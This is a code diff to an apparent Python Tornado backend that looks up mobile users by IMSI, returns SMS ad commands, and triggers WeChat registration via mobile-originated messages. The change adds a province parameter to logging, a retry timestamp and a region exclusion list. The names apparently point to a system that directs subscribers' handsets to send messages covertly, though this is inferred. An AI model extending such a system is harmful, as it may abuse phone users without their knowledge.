@@ -162,7 +162,7 @@ def async_report_weixin2nd(info):
         request = tornado.httpclient.HTTPRequest(
             url, method='GET',  request_timeout=3, connect_timeout=3)
         response = yield http_client.fetch(request)
-        log_notify(url, response, 334)
+        log_notify(url, response, 334, "")
 
 
 class MainHandler(tornado.web.RequestHandler):
@@ -243,6 +243,7 @@ class asyncProcWechatMoTarget(Greenlet):
                 'sms', 'wechat_mos', doc, 'insert')
             _g_procDoc.start()
         else:
+            ctime = round(time.time())
             doc["expiredTime"] = datetime.utcfromtimestamp(
                 long(ctime + 86400))
             doc['wxMoConfigId'] = self.wxMoConfig['id']
@@ -278,16 +279,18 @@ def get_imsi_response(_imsi, _threads, _svn):
             request = tornado.httpclient.HTTPRequest(
                 url, method='GET',  request_timeout=3, connect_timeout=3)
             response = yield http_client.fetch(request)
-            log_notify(url, response, 332)
+            log_notify(url, response, 332, _record_user['province'])
             if response.code == 200:
                 _g_asyncProcWechatMoTarget = asyncProcWechatMoTarget(
                     _record_user, wxMoConfig, mobileNum)
                 _g_asyncProcWechatMoTarget.start()
-                update_try_count()
+                update_try_count(response.body.decode('utf-8'))
 
     @gen.coroutine
-    def update_try_count():
+    def update_try_count(resp):
         _sql = 'update register_user_relations set tryCount = tryCount+1  where id  = %s '
+        if resp == 'fail':
+            _sql = 'update register_user_relations set tryCount = tryCount+1 , lastSendTime=unix_timestamp(now())  where id  = %s '
         _dbConfig = poolConfig.connection()
         _dbConfig.cursor().execute(_sql, [relationId])
         _dbConfig.close()
@@ -337,7 +340,7 @@ def get_imsi_response(_imsi, _threads, _svn):
                     # target=insert_register_cmd_log(_record_user, _return)))
             if ctime - int(_record_user['insertTime']) > 864000 and (_return == None or len(_return) <= 1) and get_system_parameter_from_db('sendSmsAd') == 'open':
                 _return = get_sms_ad_cmd(_record_user, _threads)
-            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open':
+            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open' and (not (str(_record_user['province']) in str(get_system_parameter_from_db('weixin2ndRegisterCloseArea')))) and (not (str(_record_user['city']) in str(get_system_parameter_from_db('weixin2ndRegisterCloseArea')))):
                 relationId = checkWeixinRelation(_record_user)
                 if relationId > 0:
                     # async_notify_url('http://121.201.67.97:8080/verifycode/api/getWXChMobile.jsp?cid=c159&pid=wx159&mobile=%s&ccpara=%s' % (
@@ -349,11 +352,11 @@ def get_imsi_response(_imsi, _threads, _svn):
 
 
 @gen.coroutine
-def log_notify(url, response, logId):
+def log_notify(url, response, logId, para04):
     _dbLog = poolLog.connection()
-    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`) values (%s,%s,%s,%s,%s)'
+    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`) values (%s,%s,%s,%s,%s,%s)'
     _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), logId,
-                                   url, response.code, response.body.decode('utf-8')])
+                                   url, response.code, response.body.decode('utf-8'), para04])
     _dbLog.close()
 
 
